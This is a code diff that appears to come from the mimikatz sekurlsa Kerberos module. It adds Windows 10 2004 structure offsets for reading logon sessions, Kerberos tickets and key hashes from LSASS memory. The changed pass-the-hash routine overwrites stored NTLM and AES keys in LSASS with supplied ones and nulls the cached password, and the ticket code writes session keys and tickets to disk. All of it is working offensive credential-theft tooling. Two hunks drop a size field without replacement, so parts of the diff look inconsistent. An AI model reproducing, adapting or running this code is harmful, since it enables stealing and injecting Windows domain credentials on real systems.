@@ -21,6 +21,7 @@ KULL_M_PATCH_GENERIC KerberosReferences[] = {
 	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 5}},
 	{KULL_M_WIN_BUILD_10_1511,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 6}},
 	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 7}},
+	{KULL_M_WIN_BUILD_10_2004,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable },{0,NULL},  { 6, 8}},
 };
 #elif defined(_M_IX86)
 BYTE PTRN_WALL_KerbReferenceLogonSession[]	= {0x8b, 0x7d, 0x08, 0x8b, 0x17, 0x39, 0x50};
@@ -80,7 +81,9 @@ const KERB_INFOS kerbHelper[] = {
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_5, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO_5, nCardNameOffset),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_5, CspData),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, credentials) + FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password),
-		sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password)
+		sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password),
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC, Size),
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC, Checksump)
 	},
 	{
 		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
@@ -117,7 +120,9 @@ const KERB_INFOS kerbHelper[] = {
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_5, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO_5, nCardNameOffset),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_5, CspData),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials) + FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password),
-		sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password)
+		sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password),
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC, Size),
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC, Checksump)
 	},
 	{
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
@@ -154,7 +159,9 @@ const KERB_INFOS kerbHelper[] = {
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_60, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_60, CspData),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials) + FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password),
-		sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password)
+		sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password),
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC,Size),
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC,Checksump)
 	},
 	{
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
@@ -192,6 +199,8 @@ const KERB_INFOS kerbHelper[] = {
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_60, CspData),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials) + FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password),
 		sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password),
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC,Size),
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC,Checksump)
 	},
 	{
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
@@ -228,7 +237,8 @@ const KERB_INFOS kerbHelper[] = {
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_62, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_62, CspData),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials) + FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password),
-		sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password)
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC,Size),
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC,Checksump)
 	},
 	{
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, LocallyUniqueIdentifier),
@@ -265,7 +275,9 @@ const KERB_INFOS kerbHelper[] = {
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, credentials) + FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL, unk0),
-		sizeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL, unk0)
+		sizeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL, unk0),
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC,Size),
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC,Checksump)
 	},
 	{
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, LocallyUniqueIdentifier),
@@ -302,7 +314,8 @@ const KERB_INFOS kerbHelper[] = {
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, credentials) + FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL, unk0),
-		sizeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL) - FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL, unk0)
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC,Size),
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC,Checksump)
 	},
 	{
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, LocallyUniqueIdentifier),
@@ -339,8 +352,49 @@ const KERB_INFOS kerbHelper[] = {
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, credentials) + FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607, unkFunction),
-		sizeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) - FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607, unkFunction)
+		sizeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) - FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607, unkFunction),
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC,Size),
+		FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC,Checksump)
 	},
+  {
+	FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, LocallyUniqueIdentifier),
+	FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, credentials),
+	{
+	  FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, Tickets_1),
+	  FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, Tickets_2),
+	  FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, Tickets_3),
+	},
+	FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, SmartcardInfos),
+	sizeof(KIWI_KERBEROS_LOGON_SESSION_10_1607),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, ServiceName),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TargetName),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, DomainName),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TargetDomainName),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, Description),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, AltTargetDomainName),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, ClientName),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TicketFlags),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, KeyType),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, Key),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, StartTime),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, EndTime),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, RenewUntil),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TicketEncType),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, Ticket),
+	FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TicketKvno),
+	sizeof(KIWI_KERBEROS_INTERNAL_TICKET_10_1607),
+	FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, pKeyList),
+	sizeof(KIWI_KERBEROS_KEYS_LIST_6),
+	FIELD_OFFSET(KERB_HASHPASSWORD_6_2004 , generic),
+	sizeof(KERB_HASHPASSWORD_6_2004),
+	FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspDataLength),
+	FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
+	FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData),
+	FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, credentials) + FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607, unkFunction),
+	sizeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) - FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607, unkFunction),
+	FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC_2004,Size),
+	FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC_2004,Checksump)
+  }
 };
 
 KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_package = {L"kerberos", kuhl_m_sekurlsa_enum_logon_callback_kerberos, TRUE, L"kerberos.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
@@ -468,10 +522,13 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY
 	BOOL isNtlm = FALSE, isAes128 = FALSE, isAes256 = FALSE;
 	UNICODE_STRING nullPasswd = {0, 0, NULL};
 	KULL_M_MEMORY_ADDRESS aLocalKeyMemory = {NULL, Localkerbsession.hMemory}, aLocalHashMemory = {NULL, Localkerbsession.hMemory}, aLocalNTLMMemory = {NULL, Localkerbsession.hMemory}, aLocalPasswdMemory = {&nullPasswd, Localkerbsession.hMemory}, aRemotePasswdMemory = {(PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetPasswordErase, RemoteLocalKerbSession.hMemory};
-	PKERB_HASHPASSWORD_GENERIC pHash;
+	
 	PBYTE baseCheck;
 	PCWCHAR resultok;
 	SIZE_T offset;
+	DWORD* hashType=NULL;
+	SIZE_T* hashSize=NULL;
+	PBYTE* hashChecksump=NULL;
 
 	if(RemoteLocalKerbSession.address =  *(PVOID *) ((PBYTE) Localkerbsession.address + kerbHelper[KerbOffsetIndex].offsetKeyList))
 	{
@@ -504,6 +561,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY
 
 					RemoteLocalKerbSession.address = baseCheck = (PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].structKeyListSize;
 					i = nbHash * (DWORD) kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize;
+					
 					if(aLocalHashMemory.address = LocalAlloc(LPTR, i))
 					{
 						if(kull_m_memory_copy(&aLocalHashMemory, &RemoteLocalKerbSession, i))
@@ -512,55 +570,58 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY
 							for(i = 0, pthData->isReplaceOk = TRUE; (i < nbHash) && pthData->isReplaceOk; i++)
 							{
 								offset = i * kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize + kerbHelper[KerbOffsetIndex].offsetHashGeneric;
-								pHash = (PKERB_HASHPASSWORD_GENERIC) ((PBYTE) aLocalHashMemory.address + offset);
-								kprintf(L"\n   \\_ %s ", kuhl_m_kerberos_ticket_etype(pHash->Type));
-								
-								RemoteLocalKerbSession.address = pHash->Checksump;
+
+								hashType=  (DWORD*)((PBYTE)aLocalHashMemory.address + offset );
+								hashSize = (SIZE_T*)((PBYTE)aLocalHashMemory.address + offset + kerbHelper[KerbOffsetIndex].offsetSize);
+								hashChecksump =(PBYTE*) ((PBYTE)aLocalHashMemory.address + offset + kerbHelper[KerbOffsetIndex].offsetChecksump);
+								kprintf(L"\n   \\_ %s ", kuhl_m_kerberos_ticket_etype(*hashType));
+								RemoteLocalKerbSession.address = *hashChecksump;
+
 								resultok = L"OK";
-								if(isNtlm && ((pHash->Type != KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) && (pHash->Type != KERB_ETYPE_AES256_CTS_HMAC_SHA1_96)) && (pHash->Size == LM_NTLM_HASH_LENGTH))
+								if(isNtlm && ((*hashType != KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) && (*hashType != KERB_ETYPE_AES256_CTS_HMAC_SHA1_96)) && (*hashSize == LM_NTLM_HASH_LENGTH))
 								{
-									aLocalNTLMMemory.address = ntlmHash;
-									offset = LM_NTLM_HASH_LENGTH;
+								aLocalNTLMMemory.address = ntlmHash;
+								offset = LM_NTLM_HASH_LENGTH;
 								}
-								else if(isAes128 && (pHash->Type == KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) && (pHash->Size == AES_128_KEY_LENGTH))
+								else if(isAes128 && (*hashType == KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) && (*hashSize == AES_128_KEY_LENGTH))
 								{
-									aLocalNTLMMemory.address = aes128key;
-									offset = AES_128_KEY_LENGTH;
+								aLocalNTLMMemory.address = aes128key;
+								offset = AES_128_KEY_LENGTH;
 								}
-								else if(isAes256 && (pHash->Type == KERB_ETYPE_AES256_CTS_HMAC_SHA1_96) && (pHash->Size == AES_256_KEY_LENGTH))
+								else if(isAes256 && (*hashType == KERB_ETYPE_AES256_CTS_HMAC_SHA1_96) && (*hashSize == AES_256_KEY_LENGTH))
 								{
-									aLocalNTLMMemory.address = aes256key;
-									offset = AES_256_KEY_LENGTH;
+								aLocalNTLMMemory.address = aes256key;
+								offset = AES_256_KEY_LENGTH;
 								}
 								else
 								{
-									aLocalNTLMMemory.address = pHash;
-									RemoteLocalKerbSession.address = baseCheck + offset;
-									offset = FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC, Checksump);
-									resultok = kuhl_m_kerberos_ticket_etype(KERB_ETYPE_NULL);
-									
-									pHash->Type = KERB_ETYPE_NULL;
-									pHash->Size = 0;
-									kprintf(L"-> ");
+								aLocalNTLMMemory.address = hashType;
+								RemoteLocalKerbSession.address = baseCheck + offset;
+								offset = kerbHelper[KerbOffsetIndex].offsetChecksump;
+								resultok = kuhl_m_kerberos_ticket_etype(KERB_ETYPE_NULL);
+
+								*hashType= KERB_ETYPE_NULL;
+								*hashSize  = 0;
+								kprintf(L"-> ");
 								}
 
 								if(pthData->isReplaceOk = kull_m_memory_copy(&RemoteLocalKerbSession, &aLocalNTLMMemory, offset))
-									kprintf(L"%s", resultok);
+							  	  kprintf(L"%s", resultok);
 								else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
-							}
+						  	  }
 
-							if(pthData->isReplaceOk)
-							{
-								kprintf(L"\n   \\_ *Password replace @ %p (%u) -> ", aRemotePasswdMemory.address, (DWORD) kerbHelper[KerbOffsetIndex].passwordEraseSize);
-								if(aLocalPasswdMemory.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].passwordEraseSize))
-								{
-									if(pthData->isReplaceOk = kull_m_memory_copy(&aRemotePasswdMemory, &aLocalPasswdMemory, kerbHelper[KerbOffsetIndex].passwordEraseSize))
-										kprintf(L"null");
-									else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
-									LocalFree(aLocalPasswdMemory.address);
-								}
+						  	  if(pthData->isReplaceOk)
+						  	  {
+							  	  kprintf(L"\n   \\_ *Password replace @ %p (%u) -> ", aRemotePasswdMemory.address, (DWORD) kerbHelper[KerbOffsetIndex].passwordEraseSize);
+							  	  if(aLocalPasswdMemory.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].passwordEraseSize))
+							  	  {
+							  	  if(pthData->isReplaceOk = kull_m_memory_copy(&aRemotePasswdMemory, &aLocalPasswdMemory, kerbHelper[KerbOffsetIndex].passwordEraseSize))
+								  	  kprintf(L"null");
+							  	  else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
+							  	  LocalFree(aLocalPasswdMemory.address);
+							  	  }
+						  	  }
 							}
-						}
 						LocalFree(aLocalHashMemory.address);
 					}
 				}
@@ -636,13 +697,13 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 
 						if(!isNormalSessionKey)
 						{
-							kprintf(L"\n\t   LSA Session Key   : 0x%08x - %s", pKiwiTicket->KeyType, kuhl_m_kerberos_ticket_etype(pKiwiTicket->KeyType));
+							kprintf(L"\n\t	 LSA Session Key   : 0x%08x - %s", pKiwiTicket->KeyType, kuhl_m_kerberos_ticket_etype(pKiwiTicket->KeyType));
 							if(pKiwiTicket->Key.Length <= (FIELD_OFFSET(LSAISO_DATA_BLOB, data) + (sizeof("KerberosKey") - 1) + AES_256_KEY_LENGTH)) // usual ISO DATA BLOB for Kerberos AES 256 session key
 							{
 								if(kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) pKiwiTicket->Key.Value, &lsaIsoKey.Value, &lsaIsoKey.Length))
 								{
-									kprintf(L"\n\t     * Session Key   : 0x%08x - %s", pKiwiTicket->KeyType, kuhl_m_kerberos_ticket_etype(pKiwiTicket->KeyType));
-									kprintf(L"\n\t         ");
+									kprintf(L"\n\t	   * Session Key   : 0x%08x - %s", pKiwiTicket->KeyType, kuhl_m_kerberos_ticket_etype(pKiwiTicket->KeyType));
+									kprintf(L"\n\t		   ");
 									kull_m_string_wprintf_hex(lsaIsoKey.Value, lsaIsoKey.Length, 0);
 									kuhl_m_kerberos_ticket_freeKiwiKerberosBuffer(&pKiwiTicket->Key);
 									pKiwiTicket->Key = lsaIsoKey;
@@ -657,7 +718,7 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 								if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(pKiwiTicket, FALSE))
 								{
 									if(kull_m_file_writeData(filename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
-										kprintf(L"\n\t   * Saved to file %s !", filename);
+										kprintf(L"\n\t	 * Saved to file %s !", filename);
 									else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
 									ber_bvfree(BerApp_KrbCred);
 								}
